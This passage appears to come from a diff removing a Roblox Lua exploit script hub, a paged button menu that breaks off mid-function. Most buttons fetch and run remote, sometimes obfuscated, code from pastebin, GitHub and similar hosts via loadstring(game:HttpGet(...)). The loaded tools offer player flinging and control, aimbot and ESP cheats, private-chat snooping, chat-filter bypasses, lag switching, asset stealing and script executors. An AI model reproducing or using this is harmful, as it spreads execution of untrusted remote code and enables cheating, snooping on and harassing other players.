- AddButton("Anti Ban","0.18","0.29","Main8()")
- AddButton("Night","0.33","0.29","Main9()")
- AddButton("Day","0.48","0.29","Main10()")
- AddButton("Equip Tools","0.63","0.29","Main11()")
- AddButton("Drop Tools","0.78","0.29","Main12()")
- AddButton("Disable Menu","0.03","0.49","Main13()")
- AddButton("Enable Menu","0.18","0.49","Main14()")
- AddButton("Check Health","0.33","0.49","Main15()")
- AddButton("Show Invisible Parts","0.48","0.49","Main16()")
- AddButton("Hide Invisible Parts","0.63","0.49","Main17()")
- AddButton("Reset","0.78","0.49","Main18()")
- AddButton("Goto Camera","0.03","0.69","Main19()")
- AddButton("Goto Spawn","0.18","0.69","Main20()")
- AddButton("On X-Ray","0.33","0.69","Main21()")
- AddButton("Off X-Ray","0.48","0.69","Main22()")
- AddButton("Disable Chat","0.63","0.69","Main23()")
- AddButton("Enable Chat","0.78","0.69","Main24()")
- AddPageButton("1","FrameContent:ClearAllChildren() AddMain2()")
-end
-
-function AddMain2()
- AddButton("Check Account Age","0.03","0.09","Main25()")
- AddButton("Invite Friends","0.18","0.09","Main26()")
- AddButton("Leave","0.33","0.09","Main27()")
- AddButton("Spawn Part","0.48","0.09","Main28()")
- AddButton("Freeze Animation","0.63","0.09","Main29()")
- AddButton("UnFreeze Animation","0.78","0.09","Main30()")
- AddButton("Noclip Camera","0.03","0.29","Main31()")
- AddButton("Disable Jump","0.18","0.29","Main32()")
- AddButton("Enable Jump","0.33","0.29","Main33()")
- AddButton("Disable Control","0.48","0.29","Main34()")
- AddButton("Enable Control","0.63","0.29","Main35()")
- AddButton("Serverhop","0.78","0.29","Main36()")
- AddButton("Super Zoom","0.03","0.49","Main37()")
- AddButton("Full Brightness","0.18","0.49","Main38()")
- AddButton("Enable Dark Mode","0.33","0.49","Main39()")
- AddButton("Disable Dark Mode","0.48","0.49","Main40()")
- AddButton("Enable Laydown","0.63","0.49","Main41()")
- AddButton("Disable Laydown","0.78","0.49","Main42()")
- AddButton("Sit Character","0.03","0.69","Main43()")
- AddButton("Count Players","0.18","0.69","Main44()")
- AddButton("Remove Fog","0.33","0.69","Main45()")
- AddButton("Enable Freeze Players","0.48","0.69","Main46()")
- AddButton("Disable Freeze Players","0.63","0.69","Main47()")
- AddButton("Goto Underground","0.78","0.69","Main48()")
- AddPageButton("2","FrameContent:ClearAllChildren() AddMain3()")
-end
-
-function AddMain3()
- AddButton("Laydown","0.03","0.09","Main49()")
- AddButton("Fix Camera","0.18","0.09","Main50()")
- AddButton("Block Tool","0.33","0.09","Main51()")
- AddButton("Split Character","0.48","0.09","Main52()")
- AddButton("Change To R15","0.63","0.09","Main53()")
- AddButton("Change To R6","0.78","0.09","Main54()")
- AddButton("Enable Noclip","0.03","0.29","Main55()")
- AddButton("Disable Noclip","0.18","0.29","Main56()")
- AddButton("Enable Low Gravity","0.33","0.29","Main57()")
- AddButton("Disable Low Gravity","0.48","0.29","Main58()")
- AddButton("Enable Swim","0.63","0.29","Main59()")
- AddButton("Disable Swim","0.78","0.29","Main60()")
- AddButton("Enable Spawnpoint","0.03","0.49","Main61()")
- AddButton("Disable Spawnpoint","0.18","0.49","Main62()")
- AddButton("Enable  Reset Button","0.33","0.49","Main63()")
- AddButton("Disable Reset Button","0.48","0.49","Main64()")
- AddButton("Enable Hide Gui","0.63","0.49","Main65()")
- AddButton("Disable Hide Gui","0.78","0.49","Main66()")
- AddButton("Remove Face","0.03","0.69","Main67()")
- AddButton("Remove Arms","0.18","0.69","Main68()")
- AddButton("Remove Legs","0.33","0.69","Main69()")
- AddButton("Choose Player","0.48","0.69","Main70()")
- AddButton("Tool Name","0.63","0.69","Main71()")
- AddButton("God Mode","0.78","0.69","Main72()")
- AddPageButton("3","FrameContent:ClearAllChildren() AddMain1()")
-end
-
-
-
-function AddGhostScript1()
- AddButton("Fe Fake Lag","0.03","0.09","loadstring(game:HttpGet('https://pastebin.com/raw/VM3b0Thg'))()")
- AddButton("Fe Creepy Walker","0.18","0.09","loadstring(game:HttpGet('https://pastebin.com/raw/Cj2Tm82A'))()")
- AddButton("Calculator","0.33","0.09","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Calculator'))()")
- AddButton("Player Gui","0.48","0.09","loadstring(game:HttpGet('https://pastebin.com/raw/PCC1rtpK'))()")
- AddButton("Grab","0.63","0.09","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Grab.txt'))()")
- AddButton("Tool Giver","0.78","0.09","loadstring(game:HttpGet('https://pastebin.com/raw/u3HnnnpD'))()")
- AddButton("Teleport Gui","0.03","0.29","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Teleport%20Gui'))()")
- AddButton("Position Reader","0.18","0.29","loadstring(game:HttpGet('https://pastebin.com/raw/55yDd1UZ'))()")
- AddButton("UpDown","0.33","0.29","loadstring(game:HttpGet('https://pastebin.com/raw/3GhN6aps'))()")
- AddButton("Invisible Gui","0.48","0.29","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Invisible%20Gui'))()")
- AddButton("Auto Equip Tool","0.63","0.29","loadstring(game:HttpGet('https://pastebin.com/raw/0GpyNSAq'))()")
- AddButton("Auto Jump","0.78","0.29","loadstring(game:HttpGet('https://pastebin.com/raw/vViq08jX'))()")
- AddButton("Annoy Player","0.03","0.49","loadstring(game:HttpGet('https://pastebin.com/raw/ZME5dX7w'))()")
- AddButton("Floating v2","0.18","0.49","loadstring(game:HttpGet('https://pastebin.com/raw/wEBqjiMD'))()")
- AddButton("Fling Player","0.33","0.49","loadstring(game:HttpGet('https://pastebin.com/raw/fj5VwQtC'))()")
- AddButton("Auto Presser","0.48","0.49","loadstring(game:HttpGet('https://pastebin.com/raw/0t6bY77j'))()")
- AddButton("Hide Players","0.63","0.49","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Hide%20Players'))()")
- AddButton("RTX Gui","0.78","0.49","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/RTX%20Gui%20Hub'))()")
- AddButton("Freeze Camera","0.03","0.69","loadstring(game:HttpGet('https://pastebin.com/raw/T0S0RPTW'))()")
- AddButton("Super Tools","0.18","0.69","loadstring(game:HttpGet('https://pastebin.com/raw/sQWeMuB0'))()")
- AddButton("R6 Emotes Gui","0.33","0.69","loadstring(game:HttpGet('https://pastebin.com/raw/sZMn81tZ'))()")
- AddButton("Time Stop","0.48","0.69","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Time%20Stop'))()")
- AddButton("Hitbox Costumizer","0.63","0.69","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/HitBox%20Costumizer%20v2'))()")
- AddButton("Back/Front Flip","0.78","0.69","loadstring(game:HttpGet('https://pastebin.com/raw/yjxXnxbS'))()")
- AddPageButton("1","FrameContent:ClearAllChildren() AddGhostScript2()")
-end
-
-function AddGhostScript2()
- AddButton("Freeze Tool","0.03","0.09","loadstring(game:HttpGet('https://pastebin.com/raw/AkJS0PC7'))()")
- AddButton("Freecam","0.18","0.09","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Freecam'))()")
- AddButton("Body Part Destroyer","0.33","0.09","loadstring(game:HttpGet('https://pastebin.com/raw/eE0PQ7jk'))()")
- AddButton("Portal","0.48","0.09","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Portal'))()")
- AddButton("Attach Tool","0.63","0.09","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Attach%20Tool'))()")
- AddButton("Auto Fling Player","0.78","0.09","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Auto%20Fling%20Player'))()")
- AddButton("Telescope","0.03","0.29","loadstring(game:HttpGet('https://pastebin.com/raw/8T0STS4f'))()")
- AddButton("Copy Animation","0.18","0.29","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Copy%20Animation'))()")
- AddButton("Float R15/R6","0.33","0.29","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Float'))()")
- AddButton("Game Teleporter","0.48","0.29","loadstring(game:HttpGet('https://pastebin.com/raw/hiWAdBMa'))()")
- AddButton("Green Screen","0.63","0.29","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Green%20Screen'))()")
- AddButton("Part Fly Bypass","0.78","0.29","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Part%20Fly%20Bypass'))()")
- AddButton("Light Part Pet","0.03","0.49","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Light%20Part%20Pet'))()")
- AddButton("CCTV Camera","0.18","0.49","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/CCTV%20Camera'))()")
- AddButton("Control Player","0.33","0.49","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Control%20Player'))()")
- AddButton("Break Camera","0.48","0.49","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Break%20Camera'))()")
- AddButton("Vehicle Fly Gui","0.63","0.49","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Vehicle%20Fly%20Gui'))()")
- AddButton("Timer","0.78","0.49","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Timer'))()")
- AddButton("Chat Hax","0.03","0.69","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Chat%20Hax'))()")
- AddButton("Face Changer","0.18","0.69","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Face%20Changer'))()")
- AddButton("Modifer Gui","0.33","0.69","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Modifier%20Gui'))()")
- AddButton("Player Death Notification","0.48","0.69","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Player%20Death%20Notification'))()")
- AddButton("Hide Players","0.63","0.69","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Hide%20Players'))()")
- AddButton("Void","0.78","0.69","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Void'))()")
- AddPageButton("2","FrameContent:ClearAllChildren() AddGhostScript3()")
-end
-
-function AddGhostScript3()
- AddButton("Auto Walk","0.03","0.09","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Auto%20Walk%20Obfuscator'))()")
- AddButton("Player Remover","0.18","0.09","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Player%20Remover%20Obfuscator'))()")
- AddButton("Body Follow Camera","0.33","0.09","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Body%20Follow%20Camera'))()")
- AddButton("Player Join Left Notify","0.48","0.09","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Player%20Join%20Left%20Notification'))()")
- AddButton("ShiftLock","0.63","0.09","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/ShiftLock'))()")
- AddButton("Fake Headless","0.78","0.09","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Fake%20Headless%26Korblox'))()")
- AddButton("Animation Stealer","0.03","0.29","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Animation%20Stealer'))()")
- AddButton("Ghostplayer Outfit","0.18","0.29","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Ghostplayer%20Outfit'))()")
- AddButton("Part Name Detector","0.33","0.29","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Part%20Name%20Detector'))()")
- AddButton("Fe Fake Death","0.48","0.29","loadstring(game:HttpGet('https:/raw.githubusercontent.com/MainScripts352/MainScripts352/main/Fe%20Fake%20Death'))()")
- AddButton("Climb Walls","0.63","0.29","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Climb%20Walls'))()")
- AddButton("Players Detector","0.78","0.29","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Players%20Detector'))()")
- AddButton("Auto Chat","0.03","0.49","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Auto%20Chat'))()")
- AddButton("Remove All Players","0.18","0.49","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Remove%20All%20Players'))()")
- AddButton("Music Player","0.33","0.49","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Music%20Player'))()")
- AddButton("First Person Camera","0.48","0.49","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/First%20Person%20Camera'))()")
- AddButton("Anti Fling v2","0.63","0.49","loadstring(game:HttpGet('https://pastebin.com/raw/z5jptR6g'))()")
- AddButton("Headsit Gui","0.78","0.49","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Head%20Sit%20Gui'))()")
- AddButton("Animation Player","0.03","0.69","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Animation%20Player'))()")
- AddButton("Ghost Mode","0.18","0.69","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Ghost%20Mode'))()")
- AddButton("Tool Activator","0.33","0.69","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Tool%20Activator'))()")
- AddButton("Clone","0.48","0.69","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Clone'))()")
- AddButton("Upsidedown","0.63","0.69","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Upsidedown'))()")
- AddButton("Account Age Detector","0.78","0.69","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Account%20Age%20Detector'))()")
- AddPageButton("3","FrameContent:ClearAllChildren() AddGhostScript4()")
-end
-
-function AddGhostScript4()
- AddButton("Fe Animation Gui","0.03","0.09","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Fe%20Animation%20Gui'))()")
- AddButton("Face Changer Gui","0.18","0.09","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Face%20Changer%20Gui'))()")
- AddButton("Cannon Ball","0.33","0.09","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Cannon%20Ball'))()")
- AddButton("Fall Gui","0.48","0.09","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Fall%20Gui'))()")
- AddButton("Part Gui","0.63","0.09","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Part%20Gui'))()")
- AddButton("Gui Maker","0.78","0.09","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Gui%20Maker'))()")
- AddButton("Crawling Gui","0.03","0.29","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Crawling%20Gui'))()")
- AddButton("Fly Riding Gui","0.18","0.29","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Fly%20Riding%20Gui.txt'))()")
- AddButton("Hole","0.33","0.29","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Hole'))()")
- AddButton("Spam Tools","0.48","0.29","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Spam%20Tools'))()")
- AddButton("Spectator","0.63","0.29","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Spectator'))()")
- AddButton("Chat Font Gui","0.78","0.29","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Chat%20Font%20Gui'))()")
- AddButton("Clothes Stealer Gui","0.03","0.49","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Clothes%20Stealer%20Gui'))()")
- AddButton("Change Players","0.18","0.49","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/refs/heads/main/Change%20Players'))()")
- AddButton("Ambient Gui","0.33","0.49","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/refs/heads/main/Ambient%20Gui'))()")
- AddButton("Player Inspector","0.48","0.49","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/refs/heads/main/Player%20Inspector'))()")
- AddButton("Save Server Gui","0.63","0.49","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/refs/heads/main/Save%20Server%20Gui'))()")
- AddButton("Avatar Outfit Changer","0.78","0.49","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/refs/heads/main/Avatar%20Outfit%20Changer'))()")
- AddButton("Save Emotes Gui","0.03","0.69","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/refs/heads/main/Save%20Emotes%20Gui'))()")
- AddButton("Script Obfuscator","0.18","0.69","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/refs/heads/main/Script%20Obfuscator%20Gui'))()")
- AddButton("Tic Tac Toe","0.33","0.69","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/refs/heads/main/Tic%20Tac%20Toe'))()")
- AddButton("Empty","0.48","0.69","")
- AddButton("Empty","0.63","0.69","")
- AddButton("Empty","0.78","0.69","")
- AddPageButton("4","FrameContent:ClearAllChildren() AddGhostScript1()")
-end
-
-function AddOther1()
- AddButton("Infinite Yield","0.03","0.09","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Infinite%20Yield%20%5BEdited%5D.txt'))()")
- AddButton("Btool","0.18","0.09","Instance.new('HopperBin', game.Players.LocalPlayer.Backpack).BinType = 4")
- AddButton("Invisible Tool","0.33","0.09","loadstring(game:HttpGet('https://gist.githubusercontent.com/skid123skidlol/cd0d2dce51b3f20ad1aac941da06a1a1/raw/f58b98cce7d51e53ade94e7bb460e4f24fb7e0ff/%257BFE%257D%2520Invisible%2520Tool%2520(can%2520hold%2520tools)',true))()")
- AddButton("Annoy","0.48","0.09","loadstring(game:HttpGet('https://pastebin.com/raw/1cHdCvTF'))()")
- AddButton("Fe Invisible Car","0.63","0.09","loadstring(game:HttpGet('https://pastebin.com/raw/RycT000M'))()")
- AddButton("FPS Checker","0.78","0.09","loadstring(game:HttpGet('https://pastebin.com/raw/4qHBtwD4'))()")
- AddButton("Show Private Chats","0.03","0.29","loadstring(game:HttpGet('https://pastebin.com/raw/AXY5qEyr'))()")
- AddButton("Modified Walking","0.18","0.29","loadstring(game:HttpGet('https://pastebin.com/raw/qJLM35jg'))()")
- AddButton("Tp Player Gui","0.33","0.29","loadstring(game:HttpGet('https://gist.githubusercontent.com/DagerFild/b4776075a0d26ef04394133ee6bd2081/raw/0ed51ac94057d2d9a9f00e1b037b9011c76ca54a/tpGUI', true))()")
- AddButton("R15 Animation Gui","0.48","0.29","loadstring(game:HttpGet('https://pastebin.com/raw/5HNpk2yN'))()")
- AddButton("Translator","0.63","0.29","loadstring(game:HttpGet('https://pastefy.app/xMRHE8Xd/raw'))()")
- AddButton("Fe Emotes","0.78","0.29","loadstring(game:HttpGet('https://pastebin.com/raw/Pxnx5bbx'))()")
- AddButton("Animation Gui","0.03","0.49","loadstring(game:HttpGet('https://pastebin.com/raw/Rv4XeaBA'))()")
- AddButton("Fe Small","0.18","0.49","loadstring(game:HttpGet('https://pastebin.com/raw/iwBGSs0s'))()")
- AddButton("Anti Fling","0.33","0.49","loadstring(game:HttpGet('https://pastebin.com/raw/hKfDWcJw'))()")
- AddButton("Fe Yeet","0.48","0.49","loadstring(game:HttpGet('https://pastebin.com/raw/0uE8fzRY'))()")
- AddButton("Rejoin Button On Kick","0.63","0.49","loadstring(game:HttpGet('https://pastebin.com/raw/btg6ydMZ'))()")
- AddButton("Op Keyboard","0.78","0.49","loadstring(game:HttpGet('https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt', true))()")
- AddButton("Spectator","0.03","0.69","loadstring(game:HttpGet('https://pastebin.com/raw/wyvdb7gr'))()")
- AddButton("ShiftLock","0.18","0.69","loadstring(game:HttpGet('https://pastebin.com/raw/WQ9NPeDS'))()")
- AddButton("Tall Character","0.33","0.69","loadstring(game:HttpGet('https://pastebin.com/raw/xB8aWGsJ'))()")
- AddButton("Fe Ball (R15)","0.48","0.69","loadstring(game:HttpGet('https://pastebin.com/raw/rMMM3VpS'))()")
- AddButton("Wall Walking","0.63","0.69","loadstring(game:HttpGet('https://pastebin.com/raw/zXk4Rq2r'))()")
- AddButton("Fe Fly","0.78","0.69","loadstring(game:HttpGet('https://gist.githubusercontent.com/meozoneYT/bf037dff9f0a70017304ddd67fdcd370/raw/e14e74f425b060df523343cf30b787074eb3c5d2/arceus%2520x%2520fly%25202%2520obflucator'))()")
- AddPageButton("1","FrameContent:ClearAllChildren() AddOther2()")
-end
-
-function AddOther2()
- AddButton("Dex Explorer","0.03","0.09","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Shadow%20Dex%20Explorer.txt'))()")
- AddButton("Touch Fling","0.18","0.09","loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI'))()")
- AddButton("Flash Back","0.33","0.09","loadstring(game:HttpGet('https://pastebin.com/raw/cgWLwdN9', true))()")
- AddButton("Accessories Remover","0.48","0.09","loadstring(game:HttpGet('https://pastebin.com/raw/JHRfeCEi'))()")
- AddButton("Drone","0.63","0.09","loadstring(game:HttpGet('https://pastebin.com/raw/C5zDx7d8'))()")
- AddButton("Esp MapHack","0.78","0.09","loadstring(game:HttpGet('https://pastebin.com/raw/BT2ckPxB'))()")
- AddButton("Player Collision","0.03","0.29","loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/Collision.txt'),true))()")
- AddButton("Fake Tools","0.18","0.29","loadstring(game:HttpGet(('https://pastefy.app/VYIAk3o1/raw'),true))()")
- AddButton("Draw Art Chat","0.33","0.29","loadstring(game:HttpGet('https://raw.githubusercontent.com/ocfi/Choose-ARt-able-remove/main/wassdaadwasda'))()")
- AddButton("Speed Tool","0.48","0.29","loadstring(game:HttpGet('https://pastebin.com/raw/u81rsSPX'))()")
- AddButton("Crawl Gui","0.63","0.29","loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe/main/obf_vZDX8j5ggfAf58QhdJ59BVEmF6nmZgq4Mcjt2l8wn16CiStIW2P6EkNc605qv9K4.lua.txt'))()")
- AddButton("Chat Bypass","0.78","0.29","loadstring(game:HttpGet('https://pastebin.com/raw/Zh3cPqEn'))()")
- AddButton("Universal Btool","0.03","0.49","loadstring(game:GetObjects('rbxassetid://6695644299')[1].Source)()")
- AddButton("Synapse Executor","0.18","0.49","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Synapse%20Executor%20(Source%20Code).txt'))()")
- AddButton("Player Lifter","0.33","0.49","loadstring(game:HttpGet('https://pastebin.com/raw/czWTLzF1'))()")
- AddButton("Admin Spy Gui","0.48","0.49","loadstring(game:HttpGet('https://raw.githubusercontent.com/MichaelScripter/MiniScript/main/Spy%20gui.lua'))()")
- AddButton("Telekinis v2","0.63","0.49","loadstring(game:HttpGet('https://pastebin.com/raw/hAJVRPBQ'))()")
- AddButton("Freeze Button","0.78","0.49","loadstring(game:HttpGet('https://pastebin.com/raw/t0sVziwd'))()")
- AddButton("Lag Switch","0.03","0.69",'local CoreGui = game:GetService("StarterGui") CoreGui:SetCore("SendNotification", {Title = "Script",Text = "Press X to Active",Duration = 2.5,}) loadstring(game:HttpGet("https://paste.gg/p/anonymous/d3492bd620bd4c46b54680ac80b0fa0d/files/161ddd9c992c4ceba3c298458d45188a/raw", true))()')
- AddButton("Fling Gui","0.18","0.69","loadstring(game:HttpGet('https://pastebin.com/raw/LVaAkFcv'))()")
- AddButton("Krnl Executor","0.33","0.69","loadstring(game:HttpGet('https://raw.githubusercontent.com/wtfplayer/redemption/main/krnlnoui.lua'))()")
- AddButton("Vehicle Fly","0.48","0.69","loadstring(game:HttpGet('https://pastebin.com/raw/4AAmpN59'))()")
- AddButton("Mouse Cursor","0.63","0.69","loadstring(game:HttpGet(('https://pastefy.app/58d8d52G/raw'),true))()")
- AddButton("R6 Avatar","0.78","0.69","loadstring(game:HttpGet('https://pastebin.com/raw/aVGeYAB2'))()")
- AddPageButton("2","FrameContent:ClearAllChildren() AddOther3()")
-end
-
-function AddOther3()
- AddButton("White Dex Explorer","0.03","0.09","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/White%20Dex%20Explorer.txt'))()")
- AddButton("Freeze Gui","0.18","0.09","loadstring(game:HttpGet('https://raw.githubusercontent.com/creepstu/fuzzy-octo-giggle/main/Source'))()")
- AddButton("Fe Illusion","0.33","0.09","loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe/main/obf_11l7Y131YqJjZ31QmV5L8pI23V02b3191sEg26E75472Wl78Vi8870jRv5txZyL1.lua.txt'))()")
- AddButton("Player Bringer","0.48","0.09","loadstring(game:HttpGet(('https://pastebin.com/raw/VXq46irC'),true))()")
- AddButton("Aimbot Gui","0.63","0.09","loadstring(game:HttpGet('https://pastebin.com/raw/e7v4JMXD'))()")
- AddButton("Tool Animator","0.78","0.09","loadstring(game:HttpGet(('https://pastebin.com/raw/dkufMsdA'),true))()")
- AddButton("Tools Giver","0.03","0.29","loadstring(game:HttpGet(('https://pastefy.app/VYIAk3o1/raw'),true))()")
- AddButton("Fe Climb Walls","0.18","0.29","loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe/main/obf_E872F3ky4888TSVdj6Adgi1hSLtM038AyxVpTVw07QA3QUDcI3sxmuD869hYR4id.lua.txt'))()")
- AddButton("Player Orbit Gui","0.33","0.29","loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe./main/Orbit%20GUI'))()")
- AddButton("Speed & Jumppower","0.48","0.29","loadstring(game:HttpGet('https://raw.githubusercontent.com/Shugare/Speed/main/S', true))()")
- AddButton("Chat Splitter","0.63","0.29","loadstring(game:HttpGet('https://raw.githubusercontent.com/AZYsGithub/ChatBypasser-AZY/main/Chat%20Bypass%20-%20ChatSplitter(Source).lua'))()")
- AddButton("Fake Chat","0.78","0.29","loadstring(game:GetObjects('rbxassetid://1262435912')[1].Source)()")
- AddButton("Invisible Teleport Gui","0.03","0.49","loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe./dbb6ce6f6cee4f7a5c9e20d7b88e83db2a93bf25/Invisible%20GUI'))()")
- AddButton("Ignore ToucInterests","0.18","0.49","loadstring(game:HttpGet('https://raw.githubusercontent.com/zephyr10101/ignore-touchinterests/main/main',true))()")
- AddButton("Anti Afk Gui","0.33","0.49","loadstring(game:HttpGet('https://pastebin.com/raw/Yu12RUkY'))()")
- AddButton("Script Executor","0.48","0.49","loadstring(game:HttpGet('https://pastebin.com/raw/CFAfsC0b'))()")
- AddButton("Universal Esp Gui","0.63","0.49","loadstring(game:HttpGet(('https://pastebin.com/raw/XJswfPAc'),true))()")
- AddButton("Music Player Gui","0.78","0.49","loadstring(game:HttpGet('https://pastefy.app/rgyhjRLA/raw'))()")
- AddButton("FPS Boost Gui","0.03","0.69","loadstring(game:HttpGet('https://raw.githubusercontent.com/gclich/FPS-X-GUI/main/FPS_X.lua'))()")
- AddButton("Universal Flashlight","0.18","0.69","loadstring(game:HttpGet('https://pastebin.com/raw/6qrp4atm'))()")
- AddButton("Shade RTX Gui","0.33","0.69","getgenv().RTX_Name = 'Midday lite' loadstring(game:HttpGet(('https://pastefy.app/xXkUxA0P/raw'),true))()")
- AddButton("Float Tool","0.48","0.69","loadstring(game:HttpGet('https://pastebin.com/raw/3kU6xxcE'))()")
- AddButton("Custom Keyboard","0.63","0.69","loadstring(game:HttpGet('https://gist.githubusercontent.com/RedZenXYZ/4d80bfd70ee27000660e4bfa7509c667/raw/da903c570249ab3c0c1a74f3467260972c3d87e6/KeyBoard%2520From%2520Ohio%2520Fr%2520Fr'))()")
- AddButton("Auto Cliker","0.78","0.69","loadstring(game:HttpGet(('https://pastefy.app/VPqgV9IN/raw'),true))()")
- AddPageButton("3","FrameContent:ClearAllChildren() AddOther1()")
-end
----
-
-
-
-
-
-
-------Add GameHub Buttons Function
-local GameHubSlotNum = 0
-local GameHubPosX = 0.03
-local GameHubPosZ = 0.03
-
-local function AddGameHubButton(name,script)
- local GameHubButton = Instance.new("TextButton")
- GameHubButton.Parent = FrameGameHub
- GameHubButton.BackgroundColor3 = Color3.new(0,0,0)
- GameHubButton.BackgroundTransparency = 0
- GameHubButton.BorderSizePixel = 1
- GameHubButton.BorderColor3 = Color3.new(1,1,1)
- GameHubButton.Position = UDim2.new(GameHubPosX,0,GameHubPosZ)
- GameHubButton.TextColor3 = Color3.new(1,1,1)
- GameHubButton.Size = UDim2.new(0.13,0,0.068)
- GameHubButton.Font = Enum.Font.Merriweather
- GameHubButton.FontSize = Enum.FontSize.Size14
